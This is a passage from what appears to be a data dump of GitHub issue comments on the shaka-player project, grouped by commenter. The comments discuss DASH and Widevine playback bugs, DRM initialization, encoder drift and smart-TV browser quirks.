Widevine https://skylivedash-a.akamaihd.net/dash_live_03/manifest.mpd \n3 Canal Linear 05 - DASH WV Live DASH Widevine https://skylivedash-a.akamaihd.net/dash_live_05/manifest.mpd . Good Joey,\nThank you for following up, and sorry I have not communicated with you earlier.  Currently the customer is trying a new version of the packager to see if this resolve the issue.  If that is the case, I will ask the customer if we can close the incident with you.\nKinds Regards,\n\n[Description: Description: Description: Description: Description: Ericsson]http://www.ericsson.com/Arturo G. Canizares - Service Delivery Manager (SDM) II\nBMDA Media Sol BLMS CS GSDM US\n6300 Legacy Drive, Plano, TX 75024, United States\nMobile +1 940 300 0836 - Office +1 408-662-9353\n                            E-Mail: arturo.canizares@ericsson.comarturo.canizares@ericsson.com\n                           Ericsson Support:  +1 (844) 281-3459|\n                           Ericsson customer portal:  https://ericssontelevisionprod.service-now.com/ets/\nThis Communication is Confidential. We only send and receive email on the basis of the terms set out at\nhttp://www.ericsson.com/email_disclaimer/\n\nFrom: Joey Parrish [mailto:notifications@github.com]\nSent: Saturday, October 07, 2017 1:56 PM\nTo: google/shaka-player shaka-player@noreply.github.com\nCc: Arturo Canizares arturo.canizares@ericsson.com; Mention mention@noreply.github.com\nSubject: Re: [google/shaka-player] Issue Title: Halo Live PROD - Problems with Dash + Widevine (#981)\n@ArturoCanizareshttps://github.com/arturocanizares, can you provide the information we requested? Is this still an active issue for you?\n\u2014\nYou are receiving this because you were mentioned.\nReply to this email directly, view it on GitHubhttps://github.com/google/shaka-player/issues/981#issuecomment-334958206, or mute the threadhttps://github.com/notifications/unsubscribe-auth/Ad1q6r2SNdBHiS2nkyMZI8--TK8QPwkIks5sp8lGgaJpZM4PAX03.\n. ",
    "sgalkovski": "Regarding v2.3 , when you plan release it , is it scheduled for 2017 ? . ",
    "hbengali": "I am seeing a different error: Shaka Error MANIFEST.UNABLE_TO_GUESS_MANIFEST_TYPE \nI suspect something went wrong the deployment of v2.2.0. It's now working for me.. I was able to repro this and have filed a chromium bug:\nhttps://bugs.chromium.org/p/chromium/issues/detail?id=772508. ",
    "SemihGk": "Thank you for your prompt response. I just sent the app with its instructions. Please let me know if you need more information.. I was testing the demo app and I could finally reproduce the error. Please check the screenshot:\nTested video: Sintel 4k (multicodec, VTT in MP4).\n\n. Yes, I turned captions on. Then, waited maybe 30 minutes. I replayed the video again and turned off and on several times. After these tries, I could reproduce it. It is definitely tough to reproduce in the demo. It is much easier to reproduce it in our app.\nEdit: Reproduced again after I have done same steps, but this time video was not stopped. \n\n. Thank you for your responses, @vaage and @joeyparrish.\nWe did not set the mode to \"disabled\" in our application. Everything is just default. Also, same error is reproduced in the demo app. I assume demo app do not have any custom settings as well. It only happens when we turn captions on and off without changing any settings(including built-in browser controls). . Thank you, @vaage. We look forward to waiting the fix then.. Thank you for your reply, @TheModMaker . Yes, you are right! Stack trace is appeared when I inject the uncompiled library. I was importing the compiled.debug.js (it seems it is a bad idea). \nStack trace \n\"exports\u21b5exports\u21b5slice\n\u21b5readBytes@file:///opt/usr/apps/GojX41wt1P/res/wgt/lib/util/data_view_reader.js:206:42\n\u21b5parseNext@file:///opt/usr/apps/GojX41wt1P/res/wgt/lib/util/mp4_parser.js:185:35\n\u21b5parse@file:///opt/usr/apps/GojX41wt1P/res/wgt/lib/util/mp4_parser.js:141:19\n\u21b5parseInit@file:///opt/usr/apps/GojX41wt1P/res/wgt/lib/text/mp4_ttml_parser.js:56:15\n\u21b5file:///opt/usr/apps/GojX41wt1P/res/wgt/lib/text/text_engine.js:145:29\n\u21b5[native code]\u21b5run\u21b5\u21b5flus\nAlso, yes it is a wrapper from our application. It doesn't override the functions. It just initializes the shaka-player. Now, I am able to trace the bug. After some investigation, I will share the result. Thanks a lot again.\n\n. After I dug into this bug more, I found out WebKit browser partially does not support ArrayBuffer.slice() method. Specifically, slice method exists but only takes one parameter. The second parameter was causing this error. So, I had to override the ArrayBuffer.slice method based on Claudiu's answer from this link ArrayBuffer.slice override\nThis topic can be closed unless you want to add this support for old browsers. Thank you for your help again.. Well, I cannot say this is the only bug. There is also another bug which was reported here . I had to override cloneObject function based on cloneDeep. I do not receive any error so far. I can keep this topic updated if you are interested. Thank you.. @TheModMaker, I have been facing another issue. This might be more likely a StackOverflow question, but I will really appreciate any help. Because I am really desperate at this point. \nAs I said above, this application works on latest browsers and not working in this WebKit browser. Problem is that video is not playing and there is no error (also listened 'uncaught errors' in case of missing promise catch blocks). That's why I do not know how to troubleshoot.\nSo far, I realized video blob file is created and video source is loaded into video element as well. Please check screenshots.  The question is here is it possible that browser cannot detect the video codecs or video type somehow? Or what are the other possibilities that I can look for? Please accept my apologies for the unrelated question in this topic.\n\n\n. @TheModMaker. Thank you so much for the reply. Actually, I checked some of them before, but it does not still explain what's the problem for me.\n\nAre we downloading segments?\nYes, I checked the manifest. It has the segmets.\nvideo.readyState, video.playbackRate, video.paused, video.error\nwhen loadedmetadata is fired: readyState: 3, playbackRate: 0, paused: true, error: null, \nif I try to force to play, readyState: 0, playbackRate: 0, paused: false, error: MediaError code 4.\nplayer.isBuffering() (in the default demo it would be shakaDemo.localPlayer_.isBuffering())\nreturning false\nvideo events: playing, loadedmetadata, waiting (add listener before calling player.load())\nonly loadedmetadata is triggered.\n\nTry calling video.play() and try setting video.currentTime to force a seek\nTried it. Nothing happens. Also, there is no error.\nHowever, when I tried video.play() and video.pause(), an error in video element appears which is MediaError code 4(please check screenshots) although shaka does not throw an error.\n\n\nvideo.buffered: 0 . So, not possible to get ranges.\n\n\nDo you have any idea why buffered length is 0? Because, I checked the working version. That one's buffered length is 1. What may it cause this? Or what else can I check? \nWhen video is first loaded (loadedmetadata event): \n\n\nAfter forced to play and pause (waiting event): \n\n\n. > I was actually referring to checking the network tab to see if we are actually downloading them.\nOh, sorry. That's my bad. You are right. It does not download all contents. It stops downloading after 5 chunks (see screenshot). The working one keeps downloading each segment while its playing. However, it does not make sense to me if it is content is unavailable issue. Because, same urls are requested on Chrome one and TV browser one. It should download all contents. Plus, this problems are exists at all different contents (live or VOD). \n\nA length of 0 means no content is buffered. This can happen before we download segments, or if the content is not supported.\n\nCould you expand \"the content is not supported\" issue a little bit? Does it mean content is simply unavailable(which is unlikely since I can play the content) or content may not be encrypted in the browser?\n\nMedia error 4 is MEDIA_ERR_SRC_NOT_SUPPORTED. It looks like the browser doesn't like the MSE source. I see there is a mediaKeys object that doesn't look correct. Are you able to play clear content? Can you try other manifests to see if this is a content problem?\n\nMediaKeys object is different than chrome's. I realized that as well, then I thought this must be added by samsung since webkit(safari) does not support playready natively. Yes, I am able to play clear contents, but I cannot play widevine or playready contents. Regarding this topic 771 , I am having the same issue for the demo app as well. I cannot play any content except first one in the demo app. I see samsung documentation has the playready DRM playready . Do you think this issue may be an encryption issue? Since I am new at shaka-player, I do not know how to trace it from this point if this is the issue. \nThank you so much for your help.\n\n. Hmm, I never thought playready is only supported in their custom API. I will follow the #771 . However, I will ask Samsung about playready support. Thank you!. Oh, sorry I could not find a similar ticket before post this ticket. Next time, I will spend more time for searching. Thank you.. I have spent a bit more time to clarify the issue and I have a better explanation now.\nIf we load the content during an ad and initialized manifest does not have any content protection,\nSample Manifest\nnon-protected-sample-manifest.txt \ndrmEngine would not be initialized properly. Because drmEngine init is only be called when shakaPlayer.load method is fired. Please check this line: drmEngine: keySystemsInOrder . If manifest does not have any drmInfo, it would not call the queryMediaKeys . Because, it would return Promise.resolve. That's why, drmEngine would not be initialized properly and it is going to be failed when protected content is loaded because of drmEngine initialization.\nSo, we need to initialize drmEngine for future protected contents although this manifest does not have any protected content. At this case, it seems we could only check config object to see this content is protected. Therefore, I added:\nvar isAnyDrmConfigSet = (this.config_.servers && Object.keys(this.config.servers) > 0) ||\n                  (this.config_.advanced && Object.keys(this.config.advanced) > 0);                                          \n  if(!keySystemsInOrder.length && !isAnyDrmConfigSet) {\nIt works fine. So, I want to get your suggestion. At this case, should not yospace serve nonprotected  manifest during an ad? Or do they need to serve a protected flag? Otherwise, would you consider a case to reinitialize drmEngine when a manifest that has protected periods is served? Although the last case seems a solid fix, it may decrease performance since we can do that config check easily. Thank you.. Thank you for your response. I appreciate your suggestion and it seems a reasonable solution. I will share this with yospace team. However, this might be a hacky solution for them since this issue is related to shaka-player only and we cannot reproduce it on other platforms. I am just curious how about other DAI providers do. Do they encrypt ads as well? If not, this issue is going to remain for others. Also, you are right that the manifest does not tell anything about the encrypted content, but user configures the player that encrypted content will be expected. I think this should be considered. \nI will keep you updated after we discuss this with yospace. Thank you! . After some further discussion, implementing the fix to shaka will be a better solution at this case. I will work on a possible fix for this ticket since we may need this fix soon. However, this config check might not be a great idea because chromecast is overriding the drmInfo in the previous function. I still think the solution that reinitializes drm when encrypted content is received if drm manager is not initialized properly. Also, Chris is right. encrpyted event should be fired. However, it seems it is not working at all although I listened to the event during this error. . Thank you for your reply, @TheModMaker . It is actually pretty good idea. I should have noticed that. However, this approach is failed after played encrypted content for a couple min with error code 4011(UNPLAYABLE_PERIOD). Also, it throws errors at https://github.com/google/shaka-player/blob/master/lib/media/drm_engine.js#L688 if we did not configure for primetime and clearkey although this error is ignorable.  Let me test more and I will try to find another way that is based on this approach. Thanks again.. @joeyparrish Thanks for quick merge. This was a priority for us. I am sorry about that. I did not test the demo app, I tested our contents only. Anyway, I just found the issue. It seems server keys are assigned, but licenseServerUri are empty in drm config. I can fix it by adding this to my method.\nif (!config.servers[keySystem]) return null; // in a loop \nshould not allow to return phony drmInfos. What do you think?. Yeah, it sounds great. However, this might happen to other users as well if they are not aware that they should not configure drm keys even though keys are empty. Maybe, we should add a warning to documentation? \nYeah, selenium based test cases might be very useful. I would love to contribute it if you decide it to add. Thanks again. . Hmm, I have not noticed them. Thank you for sharing. Although it seems very similar to this ticket, I think there is a slight difference. From my understanding, that PR provide a mechanism to get the licenseUrl from ms:pro object and so, it won't need to configure shaka for licenseUrl. Unlikely, I need to create pssh to create MediaKeySession for my case. I hope I do not miss something?. After further discussions with Samsung, they prepared a fix for this issue and this fix is going to be released in May in their next firmware update. So, this workaround will be no longer necessary.. Check ticket for details #1294 . Thank you for providing very detailed feedback. I really appreciated. \nTo be honest, I did not really take too much attention on abr.restrictions since I was mainly using 'hard' restrictions to configure the player. However, it sounds a bit code redundancy for me. If the abrManager already restricts the variants, I am curious why do you keep 'hard' restrictions? \nFirst I thought it may be a reason that shaka player cannot revert restrictions due to the the periods are already filtered. However, this should not be the case. Otherwise, my workaround would not have worked. Then, I checked some comments. Based on this explanation and this one , I may see that you do not want to interrupt playback even though the restrictions filtered out all variants. For this case, shaka player can still filtered out all restricted variants and keep one variants which is playable. Or you can only keep one restriction configuration and you may add a 'restrictionType: 'soft' or 'hard' . However, I can see this solution's disadvantage which it may break users configurations when they upgrade the shaka player. So, it is not desirable.\nAnyway, I still think 'hard' restrictions should be applied during the playback. However, it is not a big deal since I am able to apply 'soft' restrictions, but I believe this might be confusing for other users in the future.\nAs for my solution, I thought some variables which arethis.currentAudioLanguage_, this.currentVariantRole_, this.currentAudioChannelCount_ might have changed during the playback. However, I noticed that this.abrManager_.setVariants(variants) api is called whenever those variables are changed. So, you are right. I do not need to call filterVariantsByConfig . Calling this.abrManager_.setVariants(period.variants) would be efficent since 'hard' restrictions are appled at this line for a possible fix if you consider.\nThank you. . Thank Chris. How did I miss this ticket :) I will definitely track this ticket and this would be a quite useful improvement on buffering rates. Another note, #1051  is almost same to point 1, but I would still appreciate if I can get some suggestions for other ones as well. . 2. This is great if you are going to change this behaviour. I agree this must be fixed on back-end side, I have never seen things are perfect at BE.\n3. Hmm, Although this PR is not exactly what I was considering, it is very helpful to see a different point of view. I will discuss this with my coworkers.\n4. I thought network requests using web workers would be handled in different thread. I made a simple benchmark and literally there is no difference( https://codepen.io/semihgk/pen/jvrOdr?editors=0010 ). I was considering this approach as a backup segment, but it looks like it would not necessary after implementing 1 and 2.  \nThank you very much for your reply, TheModMaker. Those are quite helpful.\nJoey, this API would have been absolutely helpful. However, as you mentioned, those TV platforms would not implement it within a near future as they maintain very old version of chromium browsers. \nThanks again. I look forward to waiting those features. I really appreciate it.\n. Thank you very much for your quick fix, @vaage . I appreciated. However, there is an edge case and your fix does not cover it unless I am wrong. If a stream starts with clear content and switches to encrypted content later, it will filter out the encrypted contents because the clear segments have different codecs. Do you want me create another ticket for this? Apologies for this. I should have mentioned this earlier.\nThank you,\nSemih.. Apologies for the misexplanation, @vaage . When I said different codecs, I meant the transition between mp4a.40.2 and mp4a.40.5 as the screenshots. With your fix, now the stream is able to switch from encrypted (mp4a.40.5) to clear (mp4a.40.2) content (I tested it works fine). However, the reverse case cannot be switched because you only filter encrypted segments at here. Now, imagine the clear content to encrypted content switch case. Clear content codec types will be stored in here. When the stream becomes encrypted, those encrypted segments will be filtered again due to the supportedTypes array will include clear content codec types only. Just a friendly reminder we initiate drmEngine even though stream starts with clear content at here . So, supportedTypes will include the codec types of clear segments.\nPlease let me know if I missed something. Thank you.. I totally understand your concern. I also agree on the switch between clear and encrypted content is a kind of hack-ish workaround on the drm flow anyway. Figuring out the best solution would be better to avoid any temporary workaround. Thank you very much.. Thank you very much for your detailed reply, @joeyparrish . It is quite clear now. So, a stream should be able to switch codec profiles even though the stream does not have any clear segment.\nI would like to speak out about some of those options:\n\n\nWe could assume that the CDM would support any profile we didn't ask about. This could be risky, as  it could lead to playback failures if we are wrong.\n\n\nThis option seems the easiest solution. In addition to this, we could implement a 'soft' restriction as we have it on AbrManager. Let's say, we can still filter out the unsupported codec profiles, but if there is no available variant left, we can leave one type of codec profiled variant which we did not ask it to CDM yet. \n\n\nWe could, on a manifest update, renegotiate with the browser to find out if the CDM supports the new codec strings. This could lead to two problems, though:\n\n\nThis one sounds the most robust solution for me. Calling navigator. requestMediaKeySystemAccess once there are new codec profiles should solve this. However, I am not quite sure about your concerns. \n\na. If the platform can only support one CDM instance at a time, this negotiation may fail for reasons unrelated to the codec strings. This would lead to a playback failure.\n\nI checked some versions of EME specs out, but I could not find any information about which drafts have EME is singleton. I checked 0.1b Feb draft, that's not a singleton. I assume previous versions does not support this navigator. requestMediaKeySystemAccess API. So, pollyfil would return a MediaSource.isTypeSupported result which shaka already calls it to filter the variants before. Thus, we should be safe.\n\nb. If the platform supports multiple CDM implementations for the same key system (software-backed and hardware-backed), it may report success for the new codec strings, but for a different CDM implementation than the one currently in use. This would lead to a playback failure.\n\nThis sounds a platform CDM implementation mistake. If different CDMs return report different results, I personally believe we should report this bug to the platform owners. I am just curios do you know any platform which has multiple CDMs for the same keySystem?\n\n\nWe could tear down the media stack and renegotiate from scratch with the new details. This would lead to an interruption in playback. Our seamless multi-period playback would no longer be seamless. As a slight improvement to this, we could keep track of all codec strings encountered in all manifest updates (even strings not currently present in the latest update of the manifest). Once we have seen all the codec strings a live stream is going to encounter (in your case, after one ad break and one content period), there would be no more need to tear down the media stack. This is probably the best option long-term, since it is the most robust.\n\n\nI can see two issues on this solution. First one as you pointed out, there would be an interruption and this is definitely a bad experience for users. Second one, the implementation would require a bit work. The last one is that the stream might have more than 2 codec profile changes. For our case, we do not know all the ads have the same codec profiles. We need to discuss this with backend team.\n\n\nWe could offer a configurable codec string list that would supplement the manifest strings. A service provider could reasonably know these in advance, and could tell us about them before we parse the manifest. This would avoid the need to tear down the media stack, and would allow us to query all necessary codec strings early. This is probably the best option short-term, since it is easy.\n\n\nThis might be tough. As for our case, none of our ad segment may have the same codec profile. It may vary as the ad urls are inserted by a 3rd party company. If you think other options are not solid, we will need to discuss this with out back-end team.\nI really appreciate for your considerations. Please let me know if I can help you to figure out a possible solution. Thanks a lot.. I really appreciated your detailed feedback. I am glad that you are also comfortable with the re-querying solution. So, I just wanted to share a quick update. I tested this possible re-querying solution on my fork (it might be a bit messy though, but very simple) . This solution seems to be working on Chrome and Tizen. I will continue testing on other platforms to see if I can find any issue on other platforms as well. Thanks a lot.. Thank you very much. I look forward to waiting for your fix. Meanwhile, I tested this approach and it is working on Tizen 17/18, LG 18 ( which those only support one video element at once), Chrome and Mozilla. Thus, this solution seems very safe to go.. @vaage , I appreciate for your concern. This is definitely not an issue as this is not causing any problem on most of the platforms (if we do not count performance case) except 2019 LG TV . I made a fix on my fork. So, there is no rush at all. This is just a 'good to have' enhancement. Thank you.. Thank you so much for your response, @TheModMaker  The reason I asked is that there is a discussion going on #1567 . It looks like shaka player should support codec profile change during live playback. So, I was not quite sure that must period Id be changed if codec profile changes. As for your comments, it has to be. It looks like our stream also changes this periodId all the time when there is a codec profile change. Thanks a lot. We can close this ticket so.. Although it is hard to say something without internal TV logs, we had a similar issue like this one. After further discussion with LG engineers, they told us their platform does not support seeking before 'loaddata' event. If you try to change video.currentTime before this event, it was causing the playback to stall. Check this doc page . So, they were suggesting us that we should use mediaOptions if we want to adjust video.currentTime before 'loadeddata' event. You may try to investigate your issue which is based on this platform limitation.. Only if manifest contains clear content, configDrmInfos won't be null. The drawback is that adds drmInfos to each variant although those do not break a playback. I considered to update configsByKeySystem directly instead of modifying manifest, but this way would cause a duplicated code issue. Also, keys are changed for chromecast in this code block. So, I preferred more simple way to add this fix.\n  . This drmInfos is going to be generated with default drmInfos. When stream switches to encrypted content, encrypted content might have a different configured drmInfos. At this situation, I do not know if there is any risk that having different drm info settings may break the playback. As for my tests in our live streams, I could not reproduce any issue.\n  . @joeyparrish suggested me a way that adding a propery to drm config may be a better way to understand this expectation. I did not add this property in this PR just in case you may be interested the \"reinitialization drm\" solution. If you do not, I will update this PR with a new config property that allows this method.. Thank you for reviewing, @joeyparrish . Last min I reversed this behavior from unencrypted to encrypted. I should have noticed this mistake. Apologies. On the other hand, it seems @TheModMaker 's suggestion more simple than mine, but it throws an error. I was going to trace that error, but I was interrupted by something else and I could not spend enough time. Do you think it is not necessary to chase his solution?  Thanks again.. Alternatively, I can move this down and I can set pssh uint8array to 'init' directly and so we would not need decode and encode again. However, it would be weird for me.. Should I create a new Error code?. Closure compiler throws an error here that set method can get Array or ArrayViewBuffer. However, Uint8Array.set can get type array as well as you can see in the doc . Alternatively, I can loop it and set it as one byte. However, this seems more reasonable for me. Any thoughts?. ",
    "jakubvojacek": "@joeyparrish perfect! cannot wait to see it & test it! \ud83d\udc4d . Forgot to mention, that HLS seems to be working better and more reliable then DASH. Both HLS and DASH are being generated with the same packager command. The HLS is on https://goo.gl/LnprQL. It is happening to me right now, when it first loads the manifest, its giving me the unable to find segment error. Once its loads the manifest again (in 5 seconds time), it starts to play. It seems like it could be the encoder drift that you described.\nOur timeshiftbufferdepth is 250 mins by default. Any idea what can we do to prevent this error from happening? Any setting either in shaka-packager or shaka-player comes to mind until the planned refactoring is completed? Thank you for your support. . the demo app. Yes, it recovers within few seconds (for me its after 5 seconds when it reloads the manifest) and then its playing without problems. The problem is only when starting the stream. Other streams, that are being processed exactly the same way, are playing instantly. When channel zapping customer will not like this behavior I am afraid. \nBut it's happening also on our other servers, for example (dash https://goo.gl/URtAU4, https://goo.gl/55Zr2j hls). In this case we are not able to play the HLS after few days of running the packager. Guess there is some other issue because encoder drift does not apply to HLS, right? In this case, restarting packager solves the issue for 20+/- hours too. . yes, ffmpeg and packager commands are here ffmpeg: https://goo.gl/j5HGih, packager: https://goo.gl/XJ8TDm\nfor the other example I shared a minute ago its https://goo.gl/9QdsVe and https://goo.gl/DVqWqE. another example, It started to happen on another of our live channels - https://goo.gl/dxc7GV.  It does not start even after a while, it keeps on saying that it's unable to find segment.\n\nHLS plays no issues\nplays in dashif player\ndash plays in android exoplayer\ndash plays in ios expressplay player (its using dash and transforms it into hls internally)\ndash plays in settopbox ekt solidui player\n\ndo you think its possible that there might be an issue with shaka player since all other players are able to play the content?\nThank you\nJakub. Thank you for the explanation, I can see the problem now. Unfortunately, I too have no idea as to why this could be happening. When we restart the packager, audio & video start times are aligned perfectly. But as the time goes, they seem to be drifting apart. I will do some more testing and then probably ask in Shaka packager github to see if they'll have some idea.\nThank you again. I am closing this issue since it's not related to shaka player.. @joeyparrish thank you for the effort, will be waiting for 2.5 :) . Just tried to compile shaka player from master and failing to use generated shaka-player.compiled.js due to ReferenceError: muxjs is not defined. I know I could link mux.js library but shouldn't it work without the library? Just trying to play regular dash without closed captions. \nI think the issue was introduced here https://github.com/google/shaka-player/commit/bcd10c272ea16334432583d5db725883078899f4#diff-7fe7cffd0a8a1684650ad9d4ef4afdbaR62. Thank you for the confirmation, was unsure whether I did not mess up the compilation somehow.. Yes, it is fixed, thank you!. For me, it would be https://github.com/google/shaka-player/issues/999 (dealing with encoder drift). Until that is resolved, we will have to stick with dashjs as our live content is playable there :(. The only difference in my fork was actually suggested by @kqyang himself and should not cause any of this I believe. The change is only about reading the subtitle file indefinitely while packaging live content. As this is VOD, it should not be affected at all. . Thank you, working perfectly!. We had to restart transcoding on the URL I shared in my previous post, please check https://goo.gl/dmZ2K7 instead.. @vaage no, does not work for me, still getting tons of cannot find segments error\n. Took around 1:40 (which is the difference in between tracks) for the playback to start. The encoder drift here is really big and we would have restarted the process already normally (we don't let it go beyond one minute), but I am keeping this alive for testing purposes. I can share some more streams with encoder drift for testing if needed.\n. @TheModMaker yes, unfortunately, there was HW replacement on the server and all the channels were restarted. They're up for a day or so. It takes a few more days for the drift to build up. \nI will post here once I have got a malfunctioning stream.\nThank you for your assistance.. @TheModMaker please check https://goo.gl/27Kqof, it's a live stream that has the issues described above. @TheModMaker when watching the input in multicast, the audio and video are in sync. Therefore this looks like shaka packager issue, right? . @TheModMaker thank you, reported in shaka packager, closing here.. Thank you @vaage, I already tried but it's failing due to mux.js error I mentioned here https://github.com/google/shaka-player/issues/1404#issuecomment-448328362. . Hello @vaage , after applying https://github.com/google/shaka-player/commit/337c1a9f02d84a54613d0f2240186b9d88fed162 I can confirm that your fix has helped and the issue is resolved, thank you again \ud83d\udc4d . ",
    "samanmohamadi": "will this be resolve in v2.5?\nI want to completely destroy the player and recreate it again but after recreating, the player looks like is dead, manifest fetched but player not working.. Thanks, I tried the second way and it's working now.. ",
    "patbenatar": "@joeyparrish thanks for this detailed write-up! Follow-up question: is there a way to use app-specific implementations of shaka.offline.IStorageEngine in case I wanted to make a very specific version that wouldn't make sense to be shipped inside of Shaka player itself?. ",
    "dalecurtis": "Android doesn't support fmp4 based HLS, so that's why it doesn't work there.  Maybe the version of shaka I tried doesn't either?. Still happens on the master branch, so not sure what the deal is.. How did you determine that there's a gap at the start of the content? I'm having trouble seeing that when inspecting the file with MP4Box.. Thanks, I took the first couple segments and ran them through ffmpeg. Seems like a \"bug\" in mediafilesegmenter, it always starts the first segements at T=10s for some reason:\nhttps://stackoverflow.com/questions/29005340/mediafilesegmenter-inserts-timed-metadata-id3-tags-in-hls-stream-but-at-the-wron\nThere doesn't seem to be any option to fix this, so I'll switch to ffmpeg for generating the segments.. ",
    "eddielisands": "The segment files are in ts format, which are not supported.. ",
    "mateon01": "The bottom line is that you can not use the sessionTypes: ['persistent-license'] attribute. Thank you for your answers.. 1. The content is protected by widevine.\n\n\nI did not get any errors and I had enough time.\n\n\nProtected media playback popups have been viewed and accepted.\n\n\nI also initialized the cache as well as the incognito tab.. Sorry for the delay.\n\n\nWhat version of Shaka Player are you using: \n* I used shaka player version 2.2.1.\nCan you reproduce the issue with our latest release version:\n* It is possible. The latest versions of shaka player, Android and chrome are available.\nCan you reproduce the issue with the latest code from\u00a0master: \n* yes\nAre you using the demo app or your own custom app:\n* https://github.com/GoogleChromeLabs/sample-media-pwa I refer to this.\nIf custom app, can you reproduce the issue using our demo app:\n* It is possible.\nWhat browser and OS are you using:\n*  Android 4, 5, 6, 7 And Android Chrome canary\nWhat are the manifest and license server URIs: \n* https://contents.pallycon.com/bunny/stream.mpd, https://tokyo.pallycon.com/ri/licenseManager.do\nWhat did you do?\n* I stored the Widevine license using PWA technology and tried to play the encrypted content using it.\nWhat did you expect to happen?\n* I expected to recover the Widevine license stored in the Media Key Session and play mpd.\nWhat actually happened?\n* The license was successfully saved and the key set ID was issued successfully. However, the \nlicense saved in the session was not restored when I tried to play it after saving.. Android versions that are not licensed are versions 4 and 5. Versions 6 and 7 will proceed normally until the license is issued.. Okay. Thank you for always.. ",
    "mimse": "Hi @tchakabam \nI\u00b4m the developer who opened the issue with castlabs. \nYou are saying that \n\nEdge and IE we need to remove the UUID box before inserting it into the clients' SourceBuffer as it causes these browsers internal media engine to crash apparently.\n\nBut I\u00b4m seeing the issue when testing with Chrome.\nHope it\u00b4s okay I\u00b4m commenting here. @tchakabam okay, I just saw in your profile you were working for castLabs :-) \nSo thought you might be working on my issue. Anyway, this is the error I\u00b4m getting\n00:00:04 357   error   video decode error\n00:00:04 357    pipeline_error  PIPELINE_ERROR_DECODE\nDOMException: Failed to execute 'appendBuffer' on 'SourceBuffer': The HTMLMediaElement.error attribute is not null. at Eb.l.me\n. @tchakabam, I work for a company using castLabs products. So I\u00b4m not familiar with their codebase.. @tchakabam, yes our source material is in Smoothstream, and castLabs converts that to DASH on the fly. We are using shaka-player in a react environment. And we are using the same code for server-side and client-side rendering.\nSo when shaka-player is imported server-side window does not exist and we get an error. \nWe do not need video server-side so by checking for window we insure shaka-player is not imported. \nHope this make sense \ud83d\ude0a. I will test this solution tomorrow. And get back to you. But I think it could work. . @joeyparrish it worked and I have updated the PR with your feedback.. @joeyparrish also if the PR is accepted would it be possible for it to be cherry-picked to 2.4?. @bansalvks You can always use native Safari HLS/Fairplay support, and use shaka-player for the other browsers.\nAlso, I can recommend Plyr for video controls and styling.. @bansalvks \nYes, that was the idea. You will also need a bit of javascript code to handle Fairplay.\nIf I remember correctly there is a code example is this SDK from apple\nhttps://download.developer.apple.com/Developer_Tools/FairPlay_Streaming_Server_SDK/FairPlay_Streaming_Server_SDK_v4.2.0.zip\nSadly use need an Apple developer account.\nYou will need two playback technologies (native HLS and Shaka-player) but they can both be controlled by the same player. ex. Plyr https://github.com/sampotts/plyr. Hi @bansalvks, I cannot provide access to the Fairplay SDK. As I said in my previous comment, you will need an Apple developer account to download the SDK.\nSorry I cannot be of more help.. Hi, @theodab your subnet should be unblocked now.. Hi, @theodab Thank you for looking at this. I\u00b4ll take your feedback back to my streaming team.. @ismena If no one else has something to add, you can close the issue. Thank you all for the investigation into this issue.. ",
    "shanmugapriyaEK": "shaka-player.txt \nLog from chrome console\n. I made changes in sample to reproduce it. Shaka demo application does not list all the track. It does a filter for language and role. I removed that piece of code in order to list all the tracks.\nRemoved the  below code in info_section.js\n // Split language and role\n  var res = languageAndRole.split(':');\n  var language = res[0];\n  var role = res[1] || '';\ntracks = tracks.filter(function(track) {\n    var langMatch = track.language == language;\n    var roleMatch = role == '' || track.roles.indexOf(role) > -1;\n    return langMatch && roleMatch;\n  });. By setting the ignoreTextStreamFailures flag  to true , I was able to resolve this issue in my sample Application. \nAlso I tried removing this check in steaming_Engine.js switchInternal_ as below\nif (!mediaState && stream.type == ContentType.TEXT ) { \n    this.loadNewTextStream(stream);\n    return;\n  }\nCan you please explain me more in detail about this ?\nIs there a possibility for fix in 2.3?. We have exposed this API to our clients. \nConsider the scenario where they wanted to switch based on bandwidth or  kind. By this way I am forcing the clients to use two API (first selectTextLanguage and then set selectTextTrack )for switching. Also they had do the filtering in their application for listing the text tracks. . Unknowingly I pressed the button. Thank you :). Thank you Joey. I have shared the demo app where you could play the content. \nNote: I am able to play the content in shaka demo app (2.3.3) as well as in our sample app with shaka version 2.8.8\nBut when I updated our application from 2.8.8 to 2.3.3 , I could not play the content in IE11 as well as in Edge. \n. All the uncompiled, debug, and release builds of Shaka demo application is working fine. . ",
    "taryodor": "@joeyparrish\nquestion fully answered, many thanks.. ",
    "peterdotjs": "@theodab thanks for the quick response! We have the content of the MPD file but have yet to parse it so I'll try out the custom networking plugin approach.. Yup, thanks for confirming!. @chrisfillmore if you see the fiddle that I linked I am already calling player.unload() on error.\nYou can see that the src of the video element has been modified to blob: - this doesn't match the original src of the video.. Thanks for the quick response!\n@TheModMaker yup as of now that's the approach - using destroy and then resetting the src, but I figured I can't be the only one that needs to rely on a fallback approach.  If you think it's a corner case then it doesn't deserve any API support. I'm fine with setting the src myself but interested to hear what the community uses as fallbacks as when this happens it's basically the worst experience of a broken video.\n@joeyparrish we're already using shaka.Player.isBrowserSupport prior to this point but still seeing some issues in the wild hence this fallback approach. I still need to dig deeper to why it's happening in these cases. If I find that they are due to cases not handled in isBrowserSupported i'll reach out again.. Thanks for providing more context, Joey. Where did you get the sense that we didn't want MediaSource set up in advance anymore?. @joeyparrish apologies for the miscommunication - I wasn't aware of the perf implications until you posted the link to the feedback from 2015. Perf I think would be the highest pri but it seems unfortunate that this design decision impacts the list of features you pointed out. From my perspective perf would be more important than getting control over the src to handle the fallback case. . Sounds like a perfect balance. Thanks Joey!. ",
    "yamass": "@niklaskorz Super excited about your work!! I have had a look at your gist and found that you are currently emitting namespaces / internal modules. Are you planning to generate external module definitions, too?. ",
    "FrancescoBorzi": "any news about this?. hello, what is the status of this PR ? still a lot needs to be done ?. ",
    "sco974": "just in case, if someone is interested, there is a lite update of the original gist here: https://gist.github.com/sco974/9c72ded8fe3e2e32ad2c2e41804ce642. ",
